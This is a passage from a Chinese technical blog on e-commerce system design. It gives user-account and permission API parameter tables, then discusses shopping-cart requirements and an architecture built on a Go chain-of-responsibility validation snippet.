</tbody></table>
<p>响应内容：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"s_token"</span>: <span class="string">"string, 用户会话标示"</span>,</span><br><span class="line">        <span class="attr">"s_token_expire"</span>: <span class="string">"string, 用户会话标示过期时间，0不过期"</span>,</span><br><span class="line">        <span class="attr">"nickname"</span>: <span class="string">"string, 用户昵称"</span>,</span><br><span class="line">        <span class="attr">"username"</span>: <span class="string">"string, 用户名"</span>,</span><br><span class="line">        <span class="attr">"avatar"</span>: <span class="string">"string, 用户头像"</span>,</span><br><span class="line">        <span class="attr">"gender"</span>: <span class="string">"string, 用户性别，male:男，female:女，other:未知"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3.快捷登录接口</p>
<p>请求参数：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>类型</th>
<th>是否必传</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>email</td>
<td>string</td>
<td>email/phone两者择一</td>
<td>用户邮箱</td>
</tr>
<tr>
<td>phone</td>
<td>string</td>
<td>email/phone两者择一</td>
<td>用户手机号</td>
</tr>
<tr>
<td>code</td>
<td>int</td>
<td>必传</td>
<td>验证码</td>
</tr>
</tbody></table>
<p>响应内容：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"s_token"</span>: <span class="string">"string, 用户会话标示"</span>,</span><br><span class="line">        <span class="attr">"s_token_expire"</span>: <span class="string">"string, 用户会话标示过期时间，0不过期"</span>,</span><br><span class="line">        <span class="attr">"nickname"</span>: <span class="string">"string, 用户昵称"</span>,</span><br><span class="line">        <span class="attr">"username"</span>: <span class="string">"string, 用户名"</span>,</span><br><span class="line">        <span class="attr">"avatar"</span>: <span class="string">"string, 用户头像"</span>,</span><br><span class="line">        <span class="attr">"gender"</span>: <span class="string">"string, 用户性别，male:男，female:女，other:未知"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>4.第三方登录接口</p>
<p>请求参数：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>类型</th>
<th>是否必传</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>type</td>
<td>string</td>
<td>必传</td>
<td>平台类型 1:facebook,2:google,3:wechat,4:qq,5:weibo,6:twitter</td>
</tr>
<tr>
<td>platform_id</td>
<td>string</td>
<td>必传</td>
<td>第三方平台用户ID</td>
</tr>
<tr>
<td>platform_token</td>
<td>string</td>
<td>必传</td>
<td>第三方平台令牌</td>
</tr>
</tbody></table>
<p>响应内容：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"s_token"</span>: <span class="string">"string, 用户会话标示"</span>,</span><br><span class="line">        <span class="attr">"s_token_expire"</span>: <span class="string">"string, 用户会话标示过期时间，0不过期"</span>,</span><br><span class="line">        <span class="attr">"username"</span>: <span class="string">"string, 用户名"</span>,</span><br><span class="line">        <span class="attr">"nickname"</span>: <span class="string">"string, 用户昵称"</span>,</span><br><span class="line">        <span class="attr">"avatar"</span>: <span class="string">"string, 用户头像"</span>,</span><br><span class="line">        <span class="attr">"gender"</span>: <span class="string">"string, 用户性别，male:男，female:女，other:未知"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>5.用户信息修改接口</p>
<p>请求参数：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>类型</th>
<th>是否必传</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>username</td>
<td>string</td>
<td>非必传</td>
<td>用户账号</td>
</tr>
<tr>
<td>nickname</td>
<td>string</td>
<td>非必传</td>
<td>昵称</td>
</tr>
<tr>
<td>avatar</td>
<td>string</td>
<td>非必传</td>
<td>头像url</td>
</tr>
<tr>
<td>gender</td>
<td>string</td>
<td>非必传</td>
<td>用户性别，male:男，female:女，other:未知</td>
</tr>
</tbody></table>
<p>响应内容：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"username"</span>: <span class="string">"string, 用户名"</span>,</span><br><span class="line">        <span class="attr">"nickname"</span>: <span class="string">"string, 用户昵称"</span>,</span><br><span class="line">        <span class="attr">"avatar"</span>: <span class="string">"string, 用户头像"</span>,</span><br><span class="line">        <span class="attr">"gender"</span>: <span class="string">"string, 用户性别，male:男，female:女，other:未知"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>6.用户登录状态校验</p>
<p>请求参数：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>类型</th>
<th>是否必传</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>s_token</td>
<td>string</td>
<td>必传</td>
<td>用户会话标示</td>
</tr>
</tbody></table>
<p>响应内容：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"s_token_expire"</span>: <span class="string">"string, 用户会话标示过期时间，0不过期， -1登录失效"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="服务接口-基础服务，对内"><a href="#服务接口-基础服务，对内" class="headerlink" title="服务接口(基础服务，对内)"></a>服务接口(基础服务，对内)</h3><p><strong>账户服务：</strong></p>
<ol>
<li>注册</li>
</ol>
<p>请求参数：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>类型</th>
<th>是否必传</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>username</td>
<td>string</td>
<td>非必传</td>
<td>用户账号</td>
</tr>
<tr>
<td>email</td>
<td>string</td>
<td>email/phone两者择一</td>
<td>用户邮箱</td>
</tr>
<tr>
<td>phone</td>
<td>string</td>
<td>email/phone两者择一</td>
<td>用户手机号</td>
</tr>
</tbody></table>
<p>交互方式一(跳转到登录页面)响应内容：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"msg"</span>: <span class="string">"OK"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"uid"</span>: <span class="string">"string, 账户ID"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>登录</li>
</ol>
<p>请求参数：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>类型</th>
<th>是否必传</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>username</td>
<td>string</td>
<td>非必传</td>
<td>用户账号</td>
</tr>
<tr>
<td>email</td>
<td>string</td>
<td>email/phone两者择一</td>
<td>用户邮箱</td>
</tr>
<tr>
<td>phone</td>
<td>string</td>
<td>email/phone两者择一</td>
<td>用户手机号</td>
</tr>
<tr>
<td>password</td>
<td>string</td>
<td>必传</td>
<td>密码</td>
</tr>
</tbody></table>
<p>响应内容：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"msg"</span>: <span class="string">"OK"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"uid"</span>: <span class="string">"string, 账户ID"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>第三方登录</li>
</ol>
<p>请求参数：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>类型</th>
<th>是否必传</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>type</td>
<td>string</td>
<td>必传</td>
<td>平台类型 1:facebook,2:google,3:wechat,4:qq,5:weibo,6:twitter</td>
</tr>
<tr>
<td>platform_id</td>
<td>string</td>
<td>必传</td>
<td>第三方平台用户ID</td>
</tr>
<tr>
<td>platform_token</td>
<td>string</td>
<td>必传</td>
<td>第三方平台令牌</td>
</tr>
</tbody></table>
<p>响应内容：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"uid"</span>: <span class="string">"string, 账户ID"</span>,</span><br><span class="line">        <span class="attr">"nickname"</span>: <span class="string">"string, 用户昵称"</span>,</span><br><span class="line">        <span class="attr">"avatar"</span>: <span class="string">"string, 用户头像"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>权限服务</strong></p>
<ol>
<li>获取系统菜单</li>
</ol>
<p>请求参数：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>类型</th>
<th>是否必传</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>ms_id</td>
<td>string</td>
<td>必传</td>
<td>系统ID</td>
</tr>
</tbody></table>
<p>响应内容：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"msg"</span>: <span class="string">"OK"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"ms_name"</span>: <span class="string">"string, 系统名称"</span>,</span><br><span class="line">        <span class="attr">"ms_desc"</span>: <span class="string">"string, 系描述"</span>,</span><br><span class="line">        <span class="attr">"ms_domain"</span>: <span class="string">"string, 系统域名"</span>,</span><br><span class="line">        <span class="attr">"list"</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">"parent_id"</span>: <span class="string">"string, 父菜单ID"</span>,</span><br><span class="line">                <span class="attr">"menu_id"</span>: <span class="string">"string, 菜单ID"</span>,</span><br><span class="line">                <span class="attr">"menu_name"</span>: <span class="string">"string, 菜单ID"</span>,</span><br><span class="line">                <span class="attr">"menu_desc"</span>: <span class="string">"string, 菜描述"</span>,</span><br><span class="line">                <span class="attr">"menu_uri"</span>: <span class="string">"string, 菜单uri"</span>,</span><br><span class="line">                <span class="attr">"child"</span> : [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">"parent_id"</span>: <span class="string">"string, 父菜单ID"</span>,</span><br><span class="line">                        <span class="attr">"menu_id"</span>: <span class="string">"string, 菜单ID"</span>,</span><br><span class="line">                        <span class="attr">"menu_name"</span>: <span class="string">"string, 菜单ID"</span>,</span><br><span class="line">                        <span class="attr">"menu_desc"</span>: <span class="string">"string, 菜描述"</span>,</span><br><span class="line">                        <span class="attr">"menu_uri"</span>: <span class="string">"string, 菜单uri"</span>,</span><br><span class="line">                        <span class="attr">"child"</span> : []</span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>权限校验</li>
</ol>
<p>请求参数：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>类型</th>
<th>是否必传</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>menu_id</td>
<td>string</td>
<td>必传</td>
<td>菜单ID</td>
</tr>
</tbody></table>
<p>响应内容：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"msg"</span>: <span class="string">"OK"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="购物体系"><a href="#购物体系" class="headerlink" title="购物体系"></a>购物体系</h1><h2 id="购物车服务"><a href="#购物车服务" class="headerlink" title="购物车服务"></a>购物车服务</h2><p>对于一个电商来讲，购物车是整个购买流程最重要的一步。因为电商发展到今天购物车不仅仅只是为了完成打包下单的功能；也是收藏、对比、促销提醒、相关推荐的重要展示窗口。如此多的能力我们该如何设计保证购物车的高性能、以及良好的扩展能力来满足未来的发展呢？</p>
<p>今天开始我们就以一个假定的场景来输出一个购物车设计：某某电商平台，是一个多租户模式（我们前面的诸多设计都是多租户模式），用户可以把商品加入到购物车，并切按照商户纬度来展示、排序。当然购物车也支持常规的各种操作：选择、删除、清空、商品失效等。并且有相关的促销能够提醒用户。同时为了监控、运营，要支撑购物车数据同步到监控、数仓等能力。</p>
<p>本文会从用户使用的角度以及服务端两个角度来讲解系统的能力。本篇我们的主要目的是说清楚购物车的能力以及一些逻辑。下一篇会进行购物车模型设计以及接口定义。</p>
<h3 id="用户视角"><a href="#用户视角" class="headerlink" title="用户视角"></a>用户视角</h3><p>我们先来定义一下在用户侧用户操作购物车的功能有哪些？</p>
<p><img src="/articles/电商设计手册/user-cart-c.png" alt="用户则需求"></p>
<p>一个购物车基本的能力基本上都在上图中，下面我们一一来分解。</p>
<h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4><p>我们从用户的角度来看，购物车对于用户来说可以添加商品到购物车（加购物车、立即购买都属于一种添加方式）；加入进购物车后，不想要了可以删除该商品（删一个、删多个、清空）；想多买可以修改购买数量，发现钱不够可以减少购买数量；或者发现红色的比白色更漂亮，可以在购物车方便的进行更换规格；对于一些价格很贵的商品，能够在购物车添加一些保障服务（其实是绑定的虚拟商品）；在要去结算的时候，还会提供选择能力让用户决定哪些商品真的本次要购买。</p>
<p>通过上面的描述我们可以看到这个过程是有其内在联系的。这里说一下关于选中功能，业界有两种做法，各有优劣，我们来看一下。淘宝的产品选中状态是保存在客户端的，并且默认不选中，刷新、重新打开APP状态会消失；京东、苏宁这一类是保存在服务端，会记录用户选中状态。针对这两种情况各有优劣。</p>
<p><strong>客户端：</strong></p>
<ol>
<li>性能，选中/不选中的逻辑直接放在本地做，减少网络请求</li>
<li>体验，多端不能同步，但是购物车相对来说更像是一个收藏夹，每次用户自己选择也无可厚非</li>
<li>计算，价格计算时需要上传本地选中商品（也可以本地计算）</li>
<li>实现，主要靠客户端实现，与服务端无关，研发解耦合</li>
</ol>
<p><strong>服务端：</strong></p>
<ol>
<li>性能，每次操作选中都需要调用服务端，而该操作可能很频繁，除了网络损耗，服务端也需要考虑该如何快速找到修改的商品</li>
<li>体验，多端同步状态，记录历史状态</li>
<li>计算，服务端可获取数据，请求时无须上传额外数据</li>
<li>实现，服务端与客户端需要商定如何交互，以及返回数据（每次选中会导致价格变化），耦合在一起</li>
</ol>
<p>个人认为这两种方式并无谁具备明显优势，完全是一种基于业务模式以及团队情况来做选择。我们这里后续的设计会基于在服务端保存商品选中状态。</p>
<p>在整个操作逻辑中，有个两个比较重要的地方单独说明一下：购买方式与购物车内修改购买属性</p>
<p><strong>购买方式</strong></p>
<p>主要的购买方式有立即购买、加入购物车、拼团购三种方式。</p>
<p>首先普通的加入购物车没什么太多要说的。重点来看下立即购买与拼团。</p>
<p>立即购买在于操作上来说就是选择商品后直接到了订单确认页面，没有购物车中去结算这一步。但是它的实现却可以依赖购物车的逻辑来做，我们来看一下使用购物车与不使用购物车实现这个逻辑有什么差别？</p>
<p>如果使用购物车来实现，也就是用户点击立即购买时，商品本质上还是加入到购物车中，但这个购物车却与原型的购物车不同，因为该购物车只能加一个商品，并且每次操作都会被覆盖。在视角效果上也是直接从商品详情页面跳转到订单确认页面。来看看这种方式的好处</p>
<ol>
<li>与购物车在订单确认、下单逻辑上一致，内部可以直接通过购物车获取数据</li>
<li>需要一个独立的专门用于一键购买的购物车来实现，内存有消耗</li>
</ol>
<p>另外一种实现方式使用一个新的数据结构，因为一般来说一键购买更简单，它只需要商品信息、价格信息即可。每次交互均可以根据sku_id来获取。</p>
<ol>
<li>订单确认、下单逻辑上需要进行改造，每次请求之间要传递约定参数</li>
<li>节省内存，上下交互通过sku_id来保证</li>
</ol>
<p>我们会采用使用在服务端一键购买以独立的购物车形式来实现。购物车的数据模型一致，保证了后续处理流程上的一致。</p>
<p>对于拼团，他其实分为两部分，首先是开团这个动作，当团成立后。我们可以选择将成团的商品加入普通购物车，同时可以加购其它商品。也可以选择将成团商品加入一键购买的购物车，保证成团商品只能买一个。拼团模式更像是加入购物车的一个前置条件。本质上它对于购物车的设计没有影响。</p>
<p><strong>购物车内修改购买属性</strong></p>
<p>这里主要是指可以在购物车便捷的操作一些需要在spu纬度操作的事情，比如：变更规格（也就是更换sku），以及选择绑定到spu纬度的服务（保险、延保等）。</p>
<p>我们重点说一下选择绑定的服务。例如：我们买一个手机，厂家提供了延保、各种其它附加服务，一般情况这种服务都是虚拟商品。但是这有个特殊情况。这些保障服务首先不能单独购买，其次他是跟主商品的数量息息相关。比如买两个手机，如果选择了加购服务，那么这些服务的数量必须是2，这会是一个联动关系。</p>
<p>这些保障服务是不能进行单独购买的，它一定要跟特定的商品捆绑销售。</p>
<p>服务端在存储这部分数据时一定需要考虑如何保存这种层级关系，这部分我们后面模型设计的时候大家会看到。</p>
<p><img src="/articles/电商设计手册/product-relations.png" alt="绑定商品关系"></p>
<h4 id="提醒"><a href="#提醒" class="headerlink" title="提醒"></a>提醒</h4><p>促销提醒很简单，返回的购物车数据，每一个商品应该携带当前的促销信息。这部分重点在于怎么获取促销信息，会在服务端看到。</p>
<p>然后说下购物车数量的提醒，也就是显示当前购物车商品的数量。一般来说进入到APP就会调用一个接口，获取用户的未读消息数、购物车商品数等。这里是需要非常高的读取速度。那么这种需求该如何满足呢？</p>
<p><strong>方案一：</strong> 我们可以设计一个结构保存了用户相关的这种提醒信息数量，每次直接读取这个数据即可。不需要去跟消息服务、购物车服务打交道拿这些数据。</p>
<p><strong>方案二：</strong> 在消息、购物车的模型中均设计一个保存总数量的字段，在读取数据的接口中，通过并发的方式调用这些服务拿到数据后进行聚合，这样在速度上只取决于最慢的服务。</p>
<p>这里我们的设计会采用 <strong>方案二</strong>，因为这样在某种程度上效率可以得到保证，同时整个系统的结构数据的一致性更容易得到保障。当然这里有个细节一定要注意，并发读取一定要设计超时，不要因为某个服务读数问题而导致拖累整个接口的性能。</p>
<p>接下来再来看看促销，这部分除了提醒，还需要提供对应的入口，让用户完成促销的操作。比如说某个商品有券，那么可以直接提供入口去领取；可凑单，有入口进入凑单列表并选择商品等。这部分需要解决的问题是服务端该如何及时从商品纬度拿到这些促销活动。</p>
<p>从用户的视角看完了，我们再来站在研发的角度看看服务端有哪些事情要做</p>
<h3 id="研发视角"><a href="#研发视角" class="headerlink" title="研发视角"></a>研发视角</h3><p>还是先来看看需求的汇总图：</p>
<p><img src="/articles/电商设计手册/user-cart-s.png" alt="服务端则需求"></p>
<h4 id="存储"><a href="#存储" class="headerlink" title="存储"></a>存储</h4><p>对于存储，首选肯定是内存存储，至于要不要落库，我觉得没有必要。说下我的理由：</p>
<ol>
<li>购物车的数据相对变化非常频繁，落库成本比较高，如果异步方式落库，很难保障一致性</li>
<li>极端情况，cache奔溃了，仅仅需要用户重新加入购物车，并且我们可以通过cache的持久化机制来保证数据的恢复</li>
</ol>
<p>所以对于购物车，我们只会把数据完全保存在内存中。</p>
<h4 id="商品销售类型发生变化"><a href="#商品销售类型发生变化" class="headerlink" title="商品销售类型发生变化"></a>商品销售类型发生变化</h4><p>现在我们来讨论 <strong>商品销售类型发生变化</strong> 这个问题。这是什么意思呢？大家想一下：比如我把A商品加入到购物车，但是一直没有结算。这时运营说针对A商品搞一个活动，拿出10个库存5折购。那么问题来了，对于之前购物车中就有该商品的用户该如何处理？<strong>这里解决的主要问题是：购物车有该商品的用户不能直接以5折买</strong>。几种方案，我们来看一下：</p>
<p><strong>方案一：</strong> 促销配置后，所有购物车中有该商品的用户失效或删除，这个方案首先被pass，操作成本太高，并且用户体验差</p>
<p><strong>方案二：</strong> 购物车中要区分同一个SKU，不同销售类型。也就是说在我们的购物车中不是按照SKU的纬度来加商品，而是通过 <strong>SKU+售卖类型</strong> 来生成一个唯一识别码。</p>
<p>可以看到 <strong>方案二</strong> 解决了同一个sku在购物车并存的问题，并且库存之前互相不影响。不过这里又有一个问题？商品的售卖类型（或者说这个标记），该怎么什么地方设置？好像商品系统可以设计、促销系统也可以设置。我们的逻辑中会在促销系统中进行配置。因为商品属于基础逻辑，如果一改就是全局库存受到影响。活动结束后很难做到自动正常售卖。因此这个标记应该落到活动中进行设置（活动设置时会通过促销系统获取该商品之前的活动是否互斥，以确保配置的活动不会互相矛盾）。</p>
<h4 id="依赖系统"><a href="#依赖系统" class="headerlink" title="依赖系统"></a>依赖系统</h4><p>购物车系统依赖了非常多的其它系统。</p>
<ul>
<li>商品系统</li>
<li>库存系统</li>
<li>促销系统</li>
<li>结算系统</li>
</ul>
<p>这些依赖的系统，有的是为了传输数据，有的是为了获取数据。我们按照这两个纬度来看一下。</p>
<p><strong>促销提醒与计算</strong></p>
<p>服务端要解决的是促销的提醒与价格计算问题。</p>
<p>现来说计算，针对这部分最佳的方式是，调用结算中心的价格计算。我们来看一下购物车中的价格计算与订单结算时的价格计算的差异。</p>
<p>首先购物车中计算价格时不知道用户的地址，这会影响运费的计算；再是不知道用券的情况。那么其实如果解决了这两个问题，我们就可以让价格计算出自同一个逻辑，仅仅是部分入参不同罢了。因此我们这里计算时可以按照最高运费来计算，同时用券默认在购物车都不使用券。对于促销问题这里是可以通过促销系统确认选中的商品可以享受哪些价格的。因此促销的价格应该计算在内。</p>
<p>接下来在再来说说如何为用户高效的提供促销的信息。先从我们的配置视野出发。</p>
<p>我们在配置一个促销活动或者发一张券时，都是将多个商品归到一个促销活动或者券的下面。如果按照活动、券的纬度来获取商品效率相对比较高。</p>
<p><img src="/articles/电商设计手册/activity-product.png" alt="活动-商品"></p>
<p>但是在购物车的场景中发生了一个变化。我们是需要从商品纬度获取到该商品的所有活动信息（全平台活动、店铺活动）；<br>那么购物车中为了展示这些信息该怎么做？很常规的一个做法（也确实不少公司是这样）：把所有活动信息取出来，遍历出所有跟该商品相关的信息。这种做法效率很低，并且无法满足大规模的应用场景，比如双十一期间。</p>
<p>因此这里为了满足该需求，促销系统需要提供一个能力按照商品获取对应促销（活动、券）。因此一般来讲促销系统配置的活动不能仅仅是按照活动纬度存储，同时还需要生成一份商品纬度的促销信息。</p>
<p><img src="/articles/电商设计手册/product-activity.png" alt="商品-活动"></p>
<h4 id="购物车数据分析"><a href="#购物车数据分析" class="headerlink" title="购物车数据分析"></a>购物车数据分析</h4><p>对于购物车数据来说，前端会通过埋点记录加入购物车数据的情况，但是前端埋点一般是记录触发了某个前端操作，但是并不知道该操作是否成功与否。以及无法及时了解当前整体购物车的数据情况。</p>
<p>为了让运营团队更完整的了解购物车当前情况，我们通过后端打本地日志，然后通过日志收集的方式将日志同步给数据、监控等服务。</p>
<h4 id="失效与排序"><a href="#失效与排序" class="headerlink" title="失效与排序"></a>失效与排序</h4><p>还有两个小部分没有讲到，一是商品该如何失效，比如：库存没有了、下架了；二是购物车中的商品是多个店铺的，排序的策略是什么？</p>
<p>由于本文我们还只是讨论需求，不涉及具体的模型设计，因此只是介绍方案。首先是商品失效，这很像一个软删除操作，一旦设置，用户侧看到的商品将是无法进行结算的，只能进行删除操作。</p>
<p>对于排序我们会采用的设计是：根据某个店铺在购物车中最后发生操作的时间，最新的操作肯定在最上面。</p>
<h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><p>通过上面我们基本上搞清楚了购物车设计中我们要做什么，依赖的系统要提供什么能力。下篇开始进入数据模型的设计、前后端接口设计。</p>
<p>如果你对购物车上面的需求还有哪些补充，欢迎留言。我们一起来完善。</p>
<h2 id="购物车架构"><a href="#购物车架构" class="headerlink" title="购物车架构"></a>购物车架构</h2><p>在上一篇文章 <a href="https://dayutalk.cn/2019/12/09/%E8%B4%AD%E7%89%A9%E8%BD%A6%E8%AE%BE%E8%AE%A1%E4%B9%8B%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">购物车设计之需求分析</a> 描述了购物车的通用需求。本文重点则在如何实现上进行架构上的设计（业务+系统架构）。</p>
<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>架构设计可以分为三个层面：</p>
<ul>
<li>业务架构</li>
<li>系统架构</li>
<li>技术架构</li>
</ul>
<p>快速简单的说明下三个架构的意思；当我们拿到购物车需求时，我们说用Golang来实现，存储用Redis；这描述的是技术架构；我们对购物车代码项目进行代码分层，设计规范，以及依赖系统的规划这叫系统架构；</p>
<p>那业务架构是什么呢？业务架构本质上是对系统架构的文字语言描述；什么意思？我们拿到一个需求首先要跟需求方进行沟通，建立统一的认知。比如：规范名词（购物车中说的商品与商品系统中商品的含义是不同的）；建立大家都能明白的模型，购物车、用户、商品、订单这些实体之间的互动，以及各自具备什么功能。</p>
<p>在业务架构分析上有很多方法论，比如：领域驱动设计，但是它并不是唯一的业务架构分析方法，也并不是说最好的。适合你的就是最好的。我们常用的实体关系图、UML图也属于业务架构领域；</p>
<p>这里需要强点一点的是，不管你用什么方式来建模设计，有设计总比没设计强，其次一定要将建模的内容体现到你的代码中去。</p>
<p>本文在业务架构上的分析借助了 <code>DDD</code> （领域驱动设计）思想；还是那句话<code>适合的就是最好的</code>。</p>
<h3 id="业务架构"><a href="#业务架构" class="headerlink" title="业务架构"></a>业务架构</h3><p>通过前面的需求分析，我们已经明确我们的购物车要干什么了。先来看一下一个典型的用户操作购物车过程。</p>
<p><img src="/articles/电商设计手册/cart-sys-00.png" alt="用户旅程"></p>
<p>在这个过程中，用户使用购物车这个载体完成了商品的购买流程；不断流动的数据是商品，购物车这个载体是稳定的。这是我们系统中的稳定点与变化点。</p>
<p>商品的流动方式可能多种多样，比如从不同地方加入购物车，不同方式加入购物车，生命周期在购物车中也不一样；但是这个流程是稳定的，一定是先让购物车中存在商品，然后才能去结算产生订单。</p>
<p>商品在购物车中的生命周期如下：</p>
<p><img src="/articles/电商设计手册/cart-sys-01.jpg" alt="过程"></p>
<p>按照这个过程，我们来看一下每个阶段对应的操作。</p>
<p><img src="/articles/电商设计手册/cart-sys-02.jpg" alt="过程对应的操作"></p>
<p>这里注意一点，加车前这个操作其实我们可以放到购物车的添加操作中，但是由于这部分是非常不稳定且多变的。我们将其独立出来，方便后续进行扩展而不影响相对比较稳定的购物车阶段。</p>
<blockquote>
<p>上面这三个阶段，按照DDD中的概念，应该叫做实体，他们整体构成了购物车这个域；今天我们先不讲这些概念，就先略过，后面有机会单独发文讲解。</p>
</blockquote>
<h4 id="加车前"><a href="#加车前" class="headerlink" title="加车前"></a>加车前</h4><p>通过流程分析，我们总结出了系统需要具备的操作接口，以及这些接口对应的实体，现在我们先来看加车前主要要做些什么；</p>
<p>加车前其实主要就是对准备加入的购物车商品进行各个纬度的校验，检查是否满足要求。</p>
<p>在让用户加车前，我们首先解决的是用户从哪里卖，然后进行验证？因为同一个商品从不同渠道购买是存在不同情况的，比如：小米手机，我们是通过秒杀买，还是通过好友众筹买，或者商城直接购买，价格存在差异，但是实际上他是同一个商品；</p>
<p>第二个问题是是否具备购买资格，还是上面说的，秒杀、众筹这个加车操作，不是谁都可以添加的，得现有资格。那么资格的检查也是放到这里；</p>
<p>第三个问题是对这个购买的商品进行商品属性上的验证，如是否上下架，有库存，限购数量等等。</p>
<p>而且大家会发现，这里的验证条件可能是非常多变的。如何构建一个方便扩展的代码呢？</p>
<p><img src="/articles/电商设计手册/cart-sys-03.jpg" alt="加车的验证"></p>
<p>整个加车过程，重要的就是根据来源来区分不同的验证。我们有两种选择方式。</p>
<p>方式一：通过策略模式+门面模式的方式来搞定。策略就是根据不同的加车来源进行不同的验证，门面就是根据不同的来源封装一个个策略；</p>
<p>方式二：通过责任链模式，但是这里需要有一个变化，这个链在执行过程中，可以选择跳过某些节点，比如：秒杀不需要库存、也不需要众筹的验证；</p>
<p>通过综合的分析我选择了责任链的模式。贴一下核心代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// 每个验证逻辑要实现的接口</span><br><span class="line">type Handler interface &#123;</span><br><span class="line">	Skipped(in interface&#123;&#125;) bool // 这里判断是否跳过</span><br><span class="line">	HandleRequest(in interface&#123;&#125;) error // 这里进行各种验证</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 责任链的节点</span><br><span class="line">type RequestChain struct &#123;</span><br><span class="line">	Handler</span><br><span class="line">	Next *RequestChain</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 设置handler</span><br><span class="line">func (h *RequestChain) SetNextHandler(in *RequestChain) *RequestChain &#123;</span><br><span class="line">	h.Next = in</span><br><span class="line">	return in</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关于设计模式，大家可以看我小伙伴的github：<a href="https://github.com/TIGERB/easy-tips/tree/master/go/src/patterns" target="_blank" rel="noopener">https://github.com/TIGERB/easy-tips/tree/master/go/src/patterns</a></p>
